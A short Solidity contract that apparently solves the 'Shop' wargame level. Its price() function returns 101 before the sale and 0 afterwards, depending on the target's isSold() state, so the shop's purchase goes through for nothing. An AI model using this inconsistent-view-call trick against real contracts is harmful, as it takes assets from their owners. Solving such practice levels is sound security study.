// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
  function isSold() external view returns (bool);
  function buy() external;

}

contract ShopAttacker {

    bool called;

  function attack(address _shopAddr) external {
    IShop(_shopAddr).buy();
  }

  function price() view external returns (uint){
    bool isSold = IShop(msg.sender).isSold();

    if (!isSold){
        return 101;
    }

    return 0;
  }

}